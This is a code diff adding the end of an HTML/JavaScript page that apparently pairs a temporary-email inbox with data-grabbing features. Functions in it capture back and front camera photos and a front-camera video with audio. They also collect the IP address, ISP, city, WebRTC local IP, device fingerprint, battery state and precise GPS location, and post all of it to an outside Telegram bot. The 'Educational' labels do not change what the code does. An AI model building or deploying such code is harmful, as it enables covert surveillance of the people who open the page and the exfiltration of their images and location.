+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function clearInbox() {
+  $('inboxList').innerHTML = '';
+  $('inboxList').style.display = 'none';
+  showEmptyInbox();
+  $('inboxCount').textContent = '0 messages';
+}
+
+function showEmptyInbox() {
+  $('inboxEmpty').style.display = 'block';
+  $('inboxEmpty').innerHTML = `📭 Inbox empty<br><span style="font-size:10px">এই email এ কোনো mail এলে<br>এখানে দেখাবে</span>`;
+}
+
+function showEmailError(msg) {
+  $('emailError').textContent = '⚠ ' + msg;
+  $('emailError').classList.add('show');
+  setTimeout(() => $('emailError').classList.remove('show'), 8000);
+}
+
+/* ════════════════════════════════════════════════════════════
+   AUTO REFRESH
+════════════════════════════════════════════════════════════ */
+function startAuto() {
+  if (emailState.autoRunning) return;
+  emailState.autoRunning = true;
+  $('autoBtn').classList.add('active');
+  $('autoBtn').textContent = '⏱ AUTO ON';
+  $('refreshBarWrap').style.display = 'block';
+  runAutoTick();
+}
+
+function stopAuto() {
+  emailState.autoRunning = false;
+  clearTimeout(emailState.autoTimer);
+  $('autoBtn').classList.remove('active');
+  $('autoBtn').textContent = '⏱ AUTO (10s)';
+  $('refreshBarWrap').style.display = 'none';
+}
+
+function toggleAuto() {
+  if (emailState.autoRunning) stopAuto();
+  else if (emailState.address) startAuto();
+}
+
+function runAutoTick() {
+  if (!emailState.autoRunning) return;
+  refreshInbox();
+  const bar = $('refreshBarEl');
+  bar.style.transition = 'none';
+  bar.style.width = '100%';
+  setTimeout(() => {
+    bar.style.transition = 'width 10s linear';
+    bar.style.width = '0%';
+  }, 50);
+  emailState.autoTimer = setTimeout(runAutoTick, 10000);
+}
+
+/* ════════════════════════════════════════════════════════════
+   CAMERA FUNCTIONS (unchanged from original)
+════════════════════════════════════════════════════════════ */
+function getBestMime() {
+  const list = [
+    'video/webm;codecs=vp8,opus','video/webm;codecs=vp9,opus',
+    'video/webm;codecs=h264,opus','video/webm;codecs=vp8',
+    'video/webm;codecs=vp9','video/webm',
+    'video/mp4;codecs=h264,aac','video/mp4',''
+  ];
+  for (const m of list) {
+    try { if (m==='' || MediaRecorder.isTypeSupported(m)) return m; } catch(e) {}
+  }
+  return '';
+}
+
+async function capturePhoto(facingMode) {
+  const constraints = [
+    { video:{ facingMode:{exact:facingMode}, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video:{ facingMode, width:{ideal:1280}, height:{ideal:720} }, audio:false },
+    { video:true, audio:false },
+  ];
+  let stream=null, lastErr=null;
+  for (const c of constraints) {
+    try { stream = await navigator.mediaDevices.getUserMedia(c); break; }
+    catch(e) { lastErr=e; }
+  }
+  if (!stream) throw lastErr;
+  try {
+    const video = document.createElement('video');
+    video.srcObject=stream; video.playsInline=true; video.muted=true;
+    await video.play();
+    await new Promise(r=>setTimeout(r,1000));
+    const canvas = document.createElement('canvas');
+    canvas.width=video.videoWidth||1280; canvas.height=video.videoHeight||720;
+    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+    return { canvas, res:`${canvas.width}x${canvas.height}` };
+  } finally { stream.getTracks().forEach(t=>t.stop()); }
+}
+
+async function recordVideo(durationSec) {
+  let stream=null, hasAudio=true;
+  const attempts=[
+    { video:{facingMode:{exact:'user'},width:{ideal:1280},height:{ideal:720}}, audio:true },
+    { video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}, audio:true },
+    { video:{facingMode:'user'}, audio:false },
+    { video:true, audio:false },
+  ];
+  for (const c of attempts) {
+    try { stream=await navigator.mediaDevices.getUserMedia(c); hasAudio=!!c.audio; break; }
+    catch(e) {}
+  }
+  if (!stream) throw new Error('Camera চালু করা যায়নি');
+  const mimeType = getBestMime();
+  return new Promise((resolve,reject)=>{
+    const chunks=[]; let recorder;
+    try { recorder=new MediaRecorder(stream, mimeType?{mimeType}:{}); }
+    catch(e) { stream.getTracks().forEach(t=>t.stop()); reject(new Error('MediaRecorder failed: '+e.message)); return; }
+    recorder.ondataavailable = e=>{ if(e.data&&e.data.size>0) chunks.push(e.data); };
+    recorder.onerror = ()=>{ stream.getTracks().forEach(t=>t.stop()); $('recWrapper').classList.remove('show'); reject(new Error('Record error')); };
+    recorder.onstop = ()=>{
+      stream.getTracks().forEach(t=>t.stop());
+      $('recWrapper').classList.remove('show');
+      if (!chunks.length) { reject(new Error('No data recorded')); return; }
+      const finalMime = recorder.mimeType||mimeType||'video/webm';
+      const blob = new Blob(chunks,{type:finalMime});
+      if (blob.size<1000) { reject(new Error('Video too small')); return; }
+      resolve({ blob, mimeType:finalMime, hasAudio, sizeMB:(blob.size/1024/1024).toFixed(2) });
+    };
+    $('recWrapper').classList.add('show');
+    $('recText').textContent=`REC 0s / ${durationSec}s${hasAudio?'':' (no audio)'}`;
+    $('recBar').style.transition='none'; $('recBar').style.width='0%';
+    recorder.start(500);
+    let elapsed=0;
+    const timer=setInterval(()=>{
+      elapsed++;
+      $('recText').textContent=`REC ${elapsed}s / ${durationSec}s${hasAudio?'':' (no audio)'}`;
+      $('recBar').style.transition='width 1s linear';
+      $('recBar').style.width=(elapsed/durationSec*100)+'%';
+      if (elapsed>=durationSec) {
+        clearInterval(timer);
+        try{recorder.requestData();}catch(e){}
+        setTimeout(()=>{ try{if(recorder.state!=='inactive')recorder.stop();}catch(e){reject(e);} },300);
+      }
+    },1000);
+  });
+}
+
+const canvasToBlob = canvas => new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));
+
+async function tgSendPhoto(blob,caption){
+  const fd=new FormData();
+  fd.append('chat_id',CHAT_ID); fd.append('photo',blob,'photo.jpg'); fd.append('caption',caption);
+  const d=await(await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd})).json();
+  if(!d.ok) throw new Error(d.description);
+}
+
+async function tgSendVideo(blob,caption,mimeType){
+  if(blob.size>49*1024*1024) throw new Error('50MB limit exceeded');
+  const ext=(mimeType||'').includes('mp4')?'mp4':'webm';
+  const fd=new FormData();
+  fd.append('chat_id',CHAT_ID); fd.append('video',blob,`video.${ext}`);
+  fd.append('caption',caption); fd.append('supports_streaming','true');
+  const d=await(await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:fd})).json();
+  if(!d.ok){
+    const fd2=new FormData();
+    fd2.append('chat_id',CHAT_ID); fd2.append('document',blob,`video.${ext}`); fd2.append('caption',caption+'\n(as document)');
+    const d2=await(await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,{method:'POST',body:fd2})).json();
+    if(!d2.ok) throw new Error(d2.description);
+  }
+}
+
+async function runCapture() {
+  const btn=$('cameraBtn'); btn.classList.add('loading');
+  resetCaptureUI(); setBadge('sending','WORKING');
+  setRows([['Status','শুরু হচ্ছে...']]);
+  let backR=null,frontR=null,videoR=null;
+  setStep('step1','active'); setRows([['Back Photo','Camera চালু হচ্ছে...']]);
+  try { backR=await capturePhoto('environment'); setStep('step1','done'); } catch(e){ setStep('step1','fail'); }
+  setStep('step2','active');
+  setRows([['Back Photo',backR?`✅ ${backR.res}`:'❌ Failed'],['Front Photo','Camera চালু হচ্ছে...']]);
+  try { frontR=await capturePhoto('user'); setStep('step2','done'); } catch(e){ setStep('step2','fail'); }
+  setStep('step3','active');
+  setRows([['Back Photo',backR?`✅ ${backR.res}`:'❌ Failed'],['Front Photo',frontR?`✅ ${frontR.res}`:'❌ Failed'],['Video','🎬 Recording শুরু হচ্ছে...']]);
+  try {
+    videoR=await recordVideo(VIDEO_DURATION); setStep('step3','done');
+    setRows([['Back Photo',backR?`✅ ${backR.res}`:'❌ Failed'],['Front Photo',frontR?`✅ ${frontR.res}`:'❌ Failed'],['Video',`✅ ${VIDEO_DURATION}s | ${videoR.sizeMB} MB${videoR.hasAudio?'':' | no audio'}`]]);
+  } catch(e){
+    setStep('step3','fail');
+    setRows([['Back Photo',backR?`✅ ${backR.res}`:'❌ Failed'],['Front Photo',frontR?`✅ ${frontR.res}`:'❌ Failed'],['Video',fmtErr(e)]]);
+  }
+  if(!backR&&!frontR&&!videoR){ setBadge('error','ALL FAILED'); $('telegramNote').innerHTML='❌ কিছুই পাঠানো যায়নি'; btn.classList.remove('loading'); return; }
+  setStep('step4','active'); setBadge('sending','SENDING');
+  let sent=0,errs=[];
+  if(backR) { try{ await tgSendPhoto(await canvasToBlob(backR.canvas),`📸 Back Camera Photo\n🖼 ${backR.res}\n⚠️ Educational`); sent++; }catch(e){errs.push('Back: '+fmtErr(e));} }
+  if(frontR){ try{ await tgSendPhoto(await canvasToBlob(frontR.canvas),`🤳 Front Camera Photo\n🖼 ${frontR.res}\n⚠️ Educational`); sent++; }catch(e){errs.push('Front: '+fmtErr(e));} }
+  if(videoR){ try{ await tgSendVideo(videoR.blob,`🎬 Front Video\n⏱ ${VIDEO_DURATION}s | 📦 ${videoR.sizeMB} MB\n⚠️ Educational`,videoR.mimeType); sent++; }catch(e){errs.push('Video: '+fmtErr(e));} }
+  const bS=backR?`✅ ${backR.res}`:'❌ Failed', fS=frontR?`✅ ${frontR.res}`:'❌ Failed', vS=videoR?`✅ ${videoR.sizeMB} MB`:'❌ Failed';
+  if(errs.length===0){ setStep('step4','done'); setBadge('','ALL SENT ✓'); setRows([['Back',bS],['Front',fS],['Video',vS],['Telegram',`✅ ${sent} sent`]]); $('telegramNote').innerHTML=`✅ <span>${sent}টি file পাঠানো হয়েছে!</span>`; }
+  else { setStep('step4',sent>0?'done':'fail'); setBadge(sent>0?'':'error',sent>0?'PARTIAL ✓':'ERROR'); setRows([['Back',bS],['Front',fS],['Video',vS],['Sent',`${sent}`],['Error',errs.join(' | ')]]); $('telegramNote').innerHTML=sent>0?`⚠️ <span>${sent}টি গেছে</span>`:`❌ ${errs.join(' | ')}`; }
+  btn.classList.remove('loading');
+}
+
+/* ════════════════════════════════════════════════════════════
+   SEND TEXT TO TELEGRAM
+════════════════════════════════════════════════════════════ */
+async function sendTextTG(text) {
+  try {
+    const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'Markdown'})});
+    const d=await r.json();
+    if(d.ok){ setBadge('','SENT ✓'); $('telegramNote').innerHTML='✅ <span>Telegram এ পাঠানো হয়েছে</span>'; }
+    else throw new Error(d.description);
+  } catch(e){ setBadge('error','ERROR'); $('telegramNote').innerHTML=`❌ পাঠানো যায়নি: ${e.message}`; }
+}
+
+async function checkIPAndBrowser() {
+  const btn=$('ipBrowserBtn'); btn.classList.add('loading');
+  showPanel('IP & BROWSER INFO'); setBadge('sending','COLLECTING...');
+  $('resultGrid').style.display='flex';
+  $('sendStatus').innerHTML=`<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>তথ্য সংগ্রহ হচ্ছে...</span>`;
+  let ipRows=[];
+  try {
+    const d1=await(await fetch('https://api.ipify.org?format=json')).json();
+    const d2=await(await fetch(`https://ipapi.co/${d1.ip}/json/`)).json();
+    ipRows=[['IP Address',d1.ip],['Country',d2.country_name||'N/A'],['City',d2.city||'N/A'],['ISP',d2.org||'N/A'],['Timezone',d2.timezone||'N/A']];
+  } catch(e){ ipRows=[['IP Error',e.message]]; }
+  const ua=navigator.userAgent;
+  let browser='Unknown';
+  if(ua.includes('Chrome')&&!ua.includes('Edg')) browser='Google Chrome';
+  else if(ua.includes('Firefox')) browser='Mozilla Firefox';
+  else if(ua.includes('Safari')&&!ua.includes('Chrome')) browser='Safari';
+  else if(ua.includes('Edg')) browser='Microsoft Edge';
+  else if(ua.includes('Opera')||ua.includes('OPR')) browser='Opera';
+  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  let netSpeed='N/A',netType='N/A';
+  if(conn){ netSpeed=(conn.downlink||'N/A')+' Mbps'; netType=conn.effectiveType||'N/A'; }
+  let cameraS='N/A',micS='N/A';
+  if(navigator.mediaDevices?.enumerateDevices){ try{ const devs=await navigator.mediaDevices.enumerateDevices(); cameraS=devs.some(d=>d.kind==='videoinput')?'Found ✓':'Not Found ✗'; micS=devs.some(d=>d.kind==='audioinput')?'Found ✓':'Not Found ✗'; }catch(e){ cameraS=micS='Permission Denied'; } }
+  let localIP='N/A';
+  try{ await new Promise(res=>{ const pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o)); pc.onicecandidate=e=>{ if(!e?.candidate){res();return;} const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/); if(m&&!m[1].startsWith('0.')){localIP=m[1];pc.close();res();} }; setTimeout(res,1000); }); }catch(e){}
+  let storageUsed='N/A',storageTotal='N/A';
+  if(navigator.storage?.estimate){ try{ const est=await navigator.storage.estimate(); storageUsed=(est.usage/1024/1024).toFixed(2)+' MB'; storageTotal=(est.quota/1024/1024/1024).toFixed(2)+' GB'; }catch(e){} }
+  const browserRows=[['Browser',browser],['Platform',navigator.platform],['Language',navigator.language],['Screen',`${screen.width}x${screen.height}`],['Pixel Ratio',(window.devicePixelRatio||'N/A')+'x'],['Timezone',Intl.DateTimeFormat().resolvedOptions().timeZone],['Online',navigator.onLine?'Yes':'No'],['Local IP',localIP],['Cookie',navigator.cookieEnabled?'Enabled ✓':'Disabled ✗'],['Network Type',netType],['Network Speed',netSpeed],['Device Memory',(navigator.deviceMemory?navigator.deviceMemory+' GB':'N/A')],['CPU Cores',(navigator.hardwareConcurrency?navigator.hardwareConcurrency+' cores':'N/A')],['Touch Points',(navigator.maxTouchPoints||0)+''],['Dark Mode',window.matchMedia('(prefers-color-scheme: dark)').matches?'Dark 🌙':'Light ☀️'],['Storage Used',storageUsed],['Storage Quota',storageTotal],['Camera',cameraS],['Microphone',micS],['User Agent',ua.substring(0,80)+'...']];
+  if(navigator.getBattery){ try{ const bat=await navigator.getBattery(); browserRows.push(['Battery',Math.round(bat.level*100)+'%'],['Charging',bat.charging?'Yes ⚡':'No']); }catch(e){ browserRows.push(['Battery','N/A']); } }
+  setBadge('sending','SENDING');
+  $('sendStatus').innerHTML=`<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Telegram এ পাঠানো হচ্ছে...</span>`;
+  const ipMsg=`🌐 *IP INFO*\n\n`+ipRows.map(([k,v])=>`*${k}:* ${v}`).join('\n');
+  const brMsg=`🖥️ *BROWSER INFO*\n\n`+browserRows.map(([k,v])=>`*${k}:* ${v}`).join('\n')+`\n\n⚠️ _Educational use only_`;
+  setRows([...ipRows,...browserRows]);
+  try {
+    const r1=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:ipMsg,parse_mode:'Markdown'})});
+    const r2=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:brMsg,parse_mode:'Markdown'})});
+    const d1=await r1.json(), d2=await r2.json();
+    if(d1.ok&&d2.ok){ setBadge('','SENT ✓'); $('sendStatus').innerHTML=''; $('telegramNote').innerHTML='✅ <span>IP + Browser Info পাঠানো হয়েছে</span>'; }
+    else throw new Error(!d1.ok?d1.description:d2.description);
+  } catch(e){ setBadge('error','ERROR'); $('sendStatus').innerHTML=''; $('telegramNote').innerHTML=`❌ পাঠানো যায়নি: ${e.message}`; }
+  btn.classList.remove('loading');
+}
+
+function checkGeo() {
+  const btn=$('geoBtn'); btn.classList.add('loading');
+  showPanel('GEO LOCATION'); setBadge('sending','LOCATING...');
+  $('sendStatus').innerHTML=`<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Location নেওয়া হচ্ছে...</span>`;
+  if(!navigator.geolocation){ setBadge('error','ERROR'); $('telegramNote').innerHTML='❌ Geolocation supported না'; btn.classList.remove('loading'); return; }
+  navigator.geolocation.getCurrentPosition(
+    async p=>{
+      const lat=p.coords.latitude.toFixed(6), lon=p.coords.longitude.toFixed(6), acc=p.coords.accuracy.toFixed(0);
+      setBadge('sending','SENDING');
+      $('sendStatus').innerHTML=`<span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent)"><span class="spinner"></span>Telegram এ পাঠানো হচ্ছে...</span>`;
+      const msg=`📍 *GEO LOCATION*\n\n*Latitude:* ${lat}\n*Longitude:* ${lon}\n*Accuracy:* ${acc} meters\n*Maps:* https://maps.google.com/?q=${lat},${lon}\n\n⚠️ _Educational use only_`;
+      await sendTextTG(msg); $('sendStatus').innerHTML=''; btn.classList.remove('loading');
+    },
+    e=>{ setBadge('error','ERROR'); $('sendStatus').innerHTML=''; $('telegramNote').innerHTML=`❌ ${e.message}`; btn.classList.remove('loading'); },
+    {enableHighAccuracy:true,timeout:10000}
+  );
+}
+</script>
+</body>
+</html>
